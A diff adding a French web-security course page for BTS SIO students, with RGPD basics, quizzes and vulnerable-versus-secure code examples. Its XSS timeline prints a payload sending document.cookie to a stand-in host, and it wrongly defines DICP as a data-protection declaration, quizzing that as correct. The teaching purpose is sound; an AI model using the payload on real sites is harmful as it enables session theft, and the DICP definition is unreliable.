@@ -1,0 +1,2188 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité et Sûreté pour Développeurs Web - BTS SIO SLAM</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Navigation fixe -->
+    <nav class="nav-fixed">
+        <div class="nav-container">
+            <div class="nav-title">🎓 Sécurité Web - BTS SIO</div>
+            <div class="nav-links">
+                <a href="#objectifs">Objectifs</a>
+                <a href="#dicp">RGPD</a>
+                <a href="#securite-surete">Sécurité/Sûreté</a>
+                <a href="#risques">Risques</a>
+                <a href="#profils">Profils</a>
+                <a href="#attaque">Timeline</a>
+                <a href="#pratique">Pratique</a>
+                <a href="#checklists">Checklists</a>
+                <a href="#ressources">Ressources</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- Titre principal -->
+        <h1 class="hero-title">🛡️ Sécurité et Sûreté pour Développeurs Web</h1>
+        <p class="hero-subtitle">Introduction à la cybersécurité applicative - BTS SIO SLAM</p>
+
+        <!-- Section Objectifs -->
+        <div id="objectifs" class="section">
+            <h2>🎯 Objectifs pédagogiques</h2>
+            <div class="objectives">
+                <div class="objective-card">
+                    <h3>🔍 Distinguer</h3>
+                    <p>Sécurité vs Sûreté dans le développement web</p>
+                    <span class="badge badge-beginner">Débutant</span>
+                </div>
+                <div class="objective-card">
+                    <h3>⚠️ Identifier</h3>
+                    <p>Les principaux risques menaçant une application</p>
+                    <span class="badge badge-intermediate">Intermédiaire</span>
+                </div>
+                <div class="objective-card">
+                    <h3>💻 Appliquer</h3>
+                    <p>Les bonnes pratiques selon votre profil développeur</p>
+                    <span class="badge badge-intermediate">Intermédiaire</span>
+                </div>
+                <div class="objective-card">
+                    <h3>⚖️ Respecter</h3>
+                    <p>Le cadre réglementaire RGPD et CNIL</p>
+                    <span class="badge badge-advanced">Avancé</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 1: DICP et cadre légal -->
+        <div id="dicp" class="section">
+            <h2>🔍 Comprendre les enjeux : DICP et cadre légal</h2>
+            
+            <h3>Qu'est-ce que le DICP ?</h3>
+            <div class="alert alert-info">
+                <div class="alert-icon">📋</div>
+                <div>
+                    Le <strong>DICP</strong> (Déclaration Informatique et Libertés) est le principe selon lequel toute application qui traite des données personnelles doit respecter la loi.
+                </div>
+            </div>
+
+            <h3>Timeline du processus RGPD</h3>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>1. Consentement</h4>
+                        <p>L'utilisateur accepte explicitement le traitement de ses données personnelles</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>2. Collecte</h4>
+                        <p>Récupération des données strictement nécessaires au service</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>3. Traitement</h4>
+                        <p>Utilisation des données selon les finalités déclarées</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>4. Exercice des droits</h4>
+                        <p>Accès, rectification, suppression à la demande</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Les 4 piliers du RGPD pour développeurs</h3>
+            <table class="visual-table">
+                <thead>
+                    <tr>
+                        <th>Principe</th>
+                        <th>Signification</th>
+                        <th>Exemple pratique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="status-icon success"></span><strong>Privacy by Design</strong></td>
+                        <td>Sécurité dès la conception</td>
+                        <td>Hacher les mots de passe (bcrypt), chiffrer les données</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon warning"></span><strong>Minimisation</strong></td>
+                        <td>Collecter uniquement le nécessaire</td>
+                        <td>Newsletter → email suffit (pas de téléphone)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon success"></span><strong>Droits des personnes</strong></td>
+                        <td>Accès, rectification, suppression</td>
+                        <td>Bouton "Supprimer mon compte" fonctionnel</td>
+                    </tr>
+                    <tr>
+                        <td><span class="status-icon warning"></span><strong>Traçabilité</strong></td>
+                        <td>Documenter les traitements</td>
+                        <td>Log des accès aux données clients</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="alert alert-success">
+                <div class="alert-icon">✅</div>
+                <div>
+                    <strong>Exemple conforme :</strong> Site e-commerce qui demande le consentement, explique l'usage des données et permet la suppression du compte.
+                </div>
+            </div>
+
+            <div class="alert alert-danger">
+                <div class="alert-icon">🚨</div>
+                <div>
+                    <strong>Exemple non-conforme :</strong> Collecter des emails sans prévenir, les revendre à des tiers, ignorer les demandes de suppression.
+                </div>
+            </div>
+
+            <!-- Quiz 1 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(1)">
+                    <span>🎯 Quiz 1 : RGPD et cadre légal</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz1" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Que signifie DICP ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(1, 1, false)">A) Déclaration d'Intérêt Commercial et Personnel</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 1, true)">B) Déclaration Informatique et Libertés</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 1, false)">C) Données Informatiques Confidentielles et Privées</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Le principe "Privacy by Design" signifie :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(1, 2, false)">A) Ajouter la sécurité après développement</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 2, true)">B) Intégrer la sécurité dès la conception</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 2, false)">C) Designer de beaux interfaces</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Pour une newsletter, quelles données sont strictement nécessaires ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(1, 3, true)">A) Email uniquement</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 3, false)">B) Email + téléphone + adresse</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 3, false)">C) Toutes les données du profil utilisateur</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. Un utilisateur demande la suppression de ses données. Vous devez :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(1, 4, false)">A) Ignorer la demande</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 4, false)">B) Répondre dans 3 mois</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 4, true)">C) Traiter la demande rapidement et confirmer</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. La traçabilité en RGPD consiste à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(1, 5, false)">A) Suivre les utilisateurs sur internet</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 5, true)">B) Documenter tous les traitements de données</div>
+                            <div class="quiz-option" onclick="selectAnswer(1, 5, false)">C) Créer des cookies de tracking</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 1</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 2: Sécurité vs Sûreté -->
+        <div id="securite-surete" class="section">
+            <h2>⚖️ Sécurité vs Sûreté : Ne plus confondre !</h2>
+            
+            <div class="security-safety-diagram">
+                <div class="circle security">
+                    <div style="font-size: 24px;">🛡️</div>
+                    <div style="font-size: 18px;">SÉCURITÉ</div>
+                    <div style="font-size: 12px; margin-top: 10px;">Protection contre attaques intentionnelles</div>
+                </div>
+                <div class="vs">VS</div>
+                <div class="circle safety">
+                    <div style="font-size: 24px;">🔧</div>
+                    <div style="font-size: 18px;">SÛRETÉ</div>
+                    <div style="font-size: 12px; margin-top: 10px;">Protection contre <br> dysfonctionnements</div>
+                </div>
+            </div>
+
+            <h3>Comparaison avec exemples concrets</h3>
+            <table class="visual-table">
+                <thead>
+                    <tr>
+                        <th>Situation</th>
+                        <th>Type</th>
+                        <th>Mesure de protection</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Un pirate tente de voler votre BDD</td>
+                        <td><span class="status-icon danger"></span><strong>Sécurité</strong></td>
+                        <td>Authentification forte, chiffrement</td>
+                    </tr>
+                    <tr>
+                        <td>Votre site plante lors du Black Friday</td>
+                        <td><span class="status-icon warning"></span><strong>Sûreté</strong></td>
+                        <td>Load balancing, monitoring</td>
+                    </tr>
+                    <tr>
+                        <td>SQL injection dans un formulaire</td>
+                        <td><span class="status-icon danger"></span><strong>Sécurité</strong></td>
+                        <td>Requêtes préparées, validation</td>
+                    </tr>
+                    <tr>
+                        <td>Bug qui efface des données</td>
+                        <td><span class="status-icon warning"></span><strong>Sûreté</strong></td>
+                        <td>Sauvegardes automatiques, tests</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="alert alert-info">
+                <div class="alert-icon">💡</div>
+                <div>
+                    <strong>Astuce mnémotechnique :</strong> 
+                    <br>🛡️ <strong>SÉCURITÉ</strong> = Se protéger des <strong>méchants</strong> (hackers)
+                    <br>🔧 <strong>SÛRETÉ</strong> = Se protéger des <strong>accidents</strong> (bugs, pannes)
+                </div>
+            </div>
+
+            <!-- Quiz 2 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(2)">
+                    <span>🎯 Quiz 2 : Sécurité vs Sûreté</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz2" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Un hacker qui tente d'injecter du code malveillant relève de :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(2, 1, true)">A) La sécurité (Security)</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 1, false)">B) La sûreté (Safety)</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 1, false)">C) Ni l'un ni l'autre</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Votre serveur tombe en panne par manque de RAM. C'est un problème de :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(2, 2, false)">A) Sécurité</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 2, true)">B) Sûreté</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 2, false)">C) Les deux à la fois</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Quelle mesure protège contre les attaques par force brute ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(2, 3, false)">A) Sauvegarde automatique</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 3, true)">B) Limitation du nombre de tentatives</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 3, false)">C) Monitoring serveur</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. Un bug qui supprime accidentellement des données relève de :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(2, 4, false)">A) La sécurité uniquement</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 4, true)">B) La sûreté uniquement</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 4, false)">C) La sécurité et la sûreté</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Le chiffrement des données sensibles est une mesure de :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(2, 5, true)">A) Sécurité (contre le vol)</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 5, false)">B) Sûreté (contre les pannes)</div>
+                            <div class="quiz-option" onclick="selectAnswer(2, 5, false)">C) Performance</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 2</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 3: Les 4 types de risques -->
+        <div id="risques" class="section">
+            <h2>🎯 Les 4 types de risques à connaître</h2>
+            
+            <div class="risk-mindmap">
+                <div class="risk-card risk-intentional">
+                    <div class="risk-icon">🎭</div>
+                    <h4>Risques Intentionnels</h4>
+                    <p>Attaques volontaires pour nuire ou voler</p>
+                </div>
+                <div class="risk-card risk-accidental">
+                    <div class="risk-icon">🤷‍♂️</div>
+                    <h4>Risques Accidentels</h4>
+                    <p>Erreurs humaines ou pannes techniques</p>
+                </div>
+                <div class="risk-card risk-regulatory">
+                    <div class="risk-icon">⚖️</div>
+                    <h4>Risques Réglementaires</h4>
+                    <p>Non-respect de la loi (RGPD)</p>
+                </div>
+                <div class="risk-card risk-operational">
+                    <div class="risk-icon">📈</div>
+                    <h4>Risques Opérationnels</h4>
+                    <p>Problèmes qui impactent le business</p>
+                </div>
+            </div>
+
+            <h3>Exemples concrets par type de risque</h3>
+            <div class="flip-cards-container">
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>🎭 INTENTIONNEL</h3>
+                                <p>Injection SQL malveillante</p>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ PROTECTION</h3>
+                                <p>Requêtes préparées PDO + validation stricte</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>🤷‍♂️ ACCIDENTEL</h3>
+                                <p>Dev pousse clés API sur GitHub</p>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ PROTECTION</h3>
+                                <p>Fichier .env + .gitignore + scan automatique</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>⚖️ RÉGLEMENTAIRE</h3>
+                                <p>Pas de bouton désinscription newsletter</p>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ PROTECTION</h3>
+                                <p>Lien de désinscription + consentement clair</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flip-card">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div>
+                                <h3>📈 OPÉRATIONNEL</h3>
+                                <p>Site lent → clients partent</p>
+                            </div>
+                        </div>
+                        <div class="flip-card-back">
+                            <div>
+                                <h3>✅ PROTECTION</h3>
+                                <p>Cache Redis + CDN + monitoring performances</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="alert alert-warning">
+                <div class="alert-icon">⚠️</div>
+                <div>
+                    <strong>Important :</strong> Un même incident peut combiner plusieurs types de risques. Par exemple, une faille XSS (risque intentionnel) peut causer une fuite de données (risque réglementaire) et une perte de clients (risque opérationnel).
+                </div>
+            </div>
+
+            <!-- Quiz 3 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(3)">
+                    <span>🎯 Quiz 3 : Types de risques</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz3" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Un développeur oublie de mettre à jour une librairie vulnérable. Quel type de risque ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(3, 1, false)">A) Intentionnel</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 1, true)">B) Accidentel</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 1, false)">C) Réglementaire</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Une attaque DDoS qui rend le site inaccessible relève de quel risque principal ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(3, 2, true)">A) Intentionnel</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 2, false)">B) Accidentel</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 2, false)">C) Opérationnel uniquement</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Collecter des emails sans consentement explicite est un risque :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(3, 3, false)">A) Accidentel</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 3, true)">B) Réglementaire</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 3, false)">C) Opérationnel</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. Un site e-commerce qui plante pendant les soldes subit quel impact ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(3, 4, false)">A) Réglementaire uniquement</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 4, true)">B) Opérationnel (perte de revenus)</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 4, false)">C) Aucun impact</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Quelle situation combine plusieurs types de risques ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(3, 5, false)">A) Sauvegarde quotidienne</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 5, true)">B) Faille XSS → vol données → amende CNIL</div>
+                            <div class="quiz-option" onclick="selectAnswer(3, 5, false)">C) Test unitaire qui passe</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 3</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 4: Sécurité par profil développeur -->
+        <div id="profils" class="section">
+            <h2>👨‍💻 Sécurité selon votre profil développeur</h2>
+
+            <div class="alert alert-info">
+                <div class="alert-icon">💡</div>
+                <div>
+                    Chaque profil de développeur a ses responsabilités spécifiques en matière de sécurité. Découvrez les vôtres !
+                </div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active" onclick="showTab('frontend', this)">🎨 Front-End</div>
+                <div class="tab" onclick="showTab('backend', this)">⚙️ Back-End</div>
+                <div class="tab" onclick="showTab('fullstack', this)">🌐 Fullstack</div>
+            </div>
+
+            <div id="frontend" class="tab-content active">
+                <h3>🎨 Profil Front-End</h3>
+                <p><strong>Votre périmètre :</strong> Interface utilisateur, navigateur client</p>
+                
+                <h4>🔐 Sécurité (protection contre attaques)</h4>
+                <ul>
+                    <li><strong>Protection XSS :</strong> Échapper les données utilisateur</li>
+                    <li><strong>HTTPS obligatoire :</strong> Vérification des certificats</li>
+                    <li><strong>Content Security Policy (CSP) :</strong> Headers de sécurité</li>
+                    <li><strong>Validation côté client :</strong> Toujours doublée côté serveur</li>
+                </ul>
+
+                <h4>🔧 Sûreté (éviter les bugs)</h4>
+                <ul>
+                    <li>Tests de compatibilité navigateur</li>
+                    <li>Gestion d'erreurs JavaScript propre</li>
+                    <li>Fallbacks pour fonctionnalités critiques</li>
+                </ul>
+
+                <div class="code-comparison">
+                    <div class="code-block bad-code">
+                        <div class="code-header">❌ Code Vulnérable XSS</div>
+                        <div class="code-content">// DANGEREUX
+element.innerHTML = userInput;
+
+// Permet injection :
+// &lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                    </div>
+                    <div class="code-block good-code">
+                        <div class="code-header">✅ Code Sécurisé</div>
+                        <div class="code-content">// SÉCURISÉ
+element.textContent = userInput;
+
+// Ou avec framework React :
+return &lt;div&gt;{userInput}&lt;/div&gt;</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="backend" class="tab-content">
+                <h3>⚙️ Profil Back-End</h3>
+                <p><strong>Votre périmètre :</strong> Serveur, base de données, logique métier</p>
+                
+                <h4>🔐 Sécurité (protection contre attaques)</h4>
+                <ul>
+                    <li><strong>Anti-injection SQL :</strong> Requêtes préparées obligatoires</li>
+                    <li><strong>Hachage des mots de passe :</strong> bcrypt, Argon2</li>
+                    <li><strong>Contrôles d'accès :</strong> RBAC, qui peut faire quoi</li>
+                    <li><strong>Gestion des logs :</strong> Pas d'infos sensibles</li>
+                </ul>
+
+                <h4>🔧 Sûreté (éviter les pannes)</h4>
+                <ul>
+                    <li>Sauvegardes automatiques BDD</li>
+                    <li>Gestion d'exceptions pour éviter les crashes</li>
+                    <li>Monitoring serveur (CPU, RAM, disque)</li>
+                </ul>
+
+                <div class="code-comparison">
+                    <div class="code-block bad-code">
+                        <div class="code-header">❌ Injection SQL Vulnérable</div>
+                        <div class="code-content">// DANGEREUX
+$query = "SELECT * FROM users 
+    WHERE id = " . $_GET['id'];
+$result = mysql_query($query);</div>
+                    </div>
+                    <div class="code-block good-code">
+                        <div class="code-header">✅ Requête Préparée</div>
+                        <div class="code-content">// SÉCURISÉ
+$stmt = $pdo->prepare(
+    "SELECT * FROM users WHERE id = ?"
+);
+$stmt->execute([$_GET['id']]);</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="fullstack" class="tab-content">
+                <h3>🌐 Profil Fullstack</h3>
+                <p><strong>Votre périmètre :</strong> Front + Back + déploiement</p>
+                
+                <h4>🔐 Sécurité (vision globale)</h4>
+                <ul>
+                    <li><strong>Sécurisation API :</strong> JWT, OAuth2, rate limiting</li>
+                    <li><strong>Authentification unifiée :</strong> SSO, session management</li>
+                    <li><strong>Tests sécurité :</strong> OWASP ZAP automatisé</li>
+                    <li><strong>Gestion des dépendances :</strong> npm audit, Snyk</li>
+                </ul>
+
+                <h4>🔧 Sûreté (résilience globale)</h4>
+                <ul>
+                    <li>Plan de Continuité (PCA) et Plan de Reprise (PRA)</li>
+                    <li>Tests end-to-end complets</li>
+                    <li>Déploiement progressif avec rollback</li>
+                </ul>
+
+                <div class="code-comparison">
+                    <div class="code-block bad-code">
+                        <div class="code-header">❌ API Sans Protection</div>
+                        <div class="code-content">// DANGEREUX
+app.get('/api/users', (req, res) => {
+    // Pas d'authentification
+    // Pas de limitation
+    res.json(allUsers);
+});</div>
+                    </div>
+                    <div class="code-block good-code">
+                        <div class="code-header">✅ API Sécurisée</div>
+                        <div class="code-content">// SÉCURISÉ
+app.get('/api/users', 
+    authenticate,
+    rateLimit({max: 100}),
+    (req, res) => {
+        res.json(authorizedUsers);
+    }
+);</div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Schéma des vulnérabilités par couche</h3>
+            <div class="layers-diagram">
+                <div class="layer frontend-layer">
+                    🎨 Front-End (HTML/CSS/JS)
+                    <span class="layer-threat">XSS</span>
+                </div>
+                <div class="layer backend-layer">
+                    ⚙️ Back-End (PHP/Java/Python)
+                    <span class="layer-threat">Injection</span>
+                </div>
+                <div class="layer database-layer">
+                    🗄️ Base de Données (MySQL/PostgreSQL)
+                    <span class="layer-threat">Vol données</span>
+                </div>
+            </div>
+
+            <!-- Quiz 4 -->
+            <div class="quiz-container">
+                <div class="quiz-header" onclick="toggleQuiz(4)">
+                    <span>🎯 Quiz 4 : Profils développeurs</span>
+                    <span class="quiz-arrow">▼</span>
+                </div>
+                <div id="quiz4" class="quiz-content">
+                    <div class="quiz-question">
+                        <div class="question-text">1. Un développeur Front-End doit prioritairement se protéger contre :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(4, 1, false)">A) L'injection SQL</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 1, true)">B) Les attaques XSS</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 1, false)">C) Les pannes serveur</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">2. Pour un développeur Back-End, quelle méthode est sécurisée pour les mots de passe ?</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(4, 2, false)">A) MD5</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 2, true)">B) bcrypt avec salt</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 2, false)">C) Base64</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">3. Un développeur Fullstack doit maîtriser :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(4, 3, false)">A) Uniquement le front-end</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 3, false)">B) Uniquement le back-end</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 3, true)">C) La sécurité front ET back</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">4. Le rate limiting sur une API sert à :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(4, 4, true)">A) Limiter les attaques par déni de service</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 4, false)">B) Accélérer les requêtes</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 4, false)">C) Diminuer la consommation mémoire</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-question">
+                        <div class="question-text">5. Pour éviter l'injection SQL, on utilise :</div>
+                        <div class="quiz-options">
+                            <div class="quiz-option" onclick="selectAnswer(4, 5, false)">A) innerHTML</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 5, true)">B) Les requêtes préparées</div>
+                            <div class="quiz-option" onclick="selectAnswer(4, 5, false)">C) Les cookies</div>
+                        </div>
+                        <div class="quiz-feedback">
+                            <div class="feedback-text"></div>
+                        </div>
+                    </div>
+
+                    <div class="quiz-score">
+                        <h4>🎉 Résultat du Quiz 4</h4>
+                        <p class="score-text"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 5: Timeline d'une cyberattaque -->
+        <div id="attaque" class="section">
+            <h2>⏱️ Timeline d'une cyberattaque : Attaque XSS</h2>
+            
+            <div class="alert alert-warning">
+                <div class="alert-icon">⚠️</div>
+                <div>
+                    <strong>Objectif pédagogique :</strong> Comprendre les étapes d'une attaque pour mieux s'en protéger. Nous allons décomposer une attaque XSS étape par étape.
+                </div>
+            </div>
+
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>🔍 1. Reconnaissance</h4>
+                        <p><strong>L'attaquant explore :</strong> Il cherche des formulaires, commentaires ou champs de recherche qui affichent les données utilisateur sans protection.</p>
+                        <small><em>Exemple : Formulaire de contact qui affiche "Merci [nom]" sans échappement</em></small>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>💉 2. Injection du payload</h4>
+                        <p><strong>Code malveillant injecté :</strong> L'attaquant insère du JavaScript dans un champ vulnérable.</p>
+                        <code>&lt;script&gt;document.location='http://malicious.com?cookie='+document.cookie&lt;/script&gt;</code>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>💾 3. Stockage/Réflexion</h4>
+                        <p><strong>Persistance :</strong> Le code est soit stocké en base de données (XSS stocké) soit renvoyé immédiatement (XSS réfléchi).</p>
+                        <small><em>XSS stocké = plus dangereux car affecte tous les visiteurs</em></small>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-content">
+                        <h4>⚡ 4. Exécution</h4>
+                        <p><strong>Victimes piégées :</strong> Les utilisateurs qui visitent la page déclenchent l'exécution du code JavaScript malveillant.</p>
+                        <small><em>Résultat : Vol de cookies, redirection, actions à l'insu de l'utilisateur</em></small>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Code vulnérable vs Code protégé</h3>
+            <div class="code-comparison">
+                <div class="code-block bad-code">
+                    <div class="code-header">❌ Code Vulnérable PHP</div>
+                    <div class="code-content">&lt;?php
+// DANGEREUX : Affichage direct
+echo "Bonjour " . $_POST['nom'];
+
+// Permet l'injection :
+// &lt;script&gt;alert('XSS')&lt;/script&gt;
+
+// Résultat affiché :
+// Bonjour &lt;script&gt;alert('XSS')&lt;/script&gt;
+// Le script s'exécute !
+?&gt;</div>
+                </div>
+                <div class="code-block good-code">
+                    <div class="code-header">✅ Code Protégé PHP</div>
+                    <div class="code-content">&lt;?php
+// SÉCURISÉ : Échappement HTML
+echo "Bonjour " . htmlspecialchars($_POST['nom'], ENT_QUOTES, 'UTF-8');
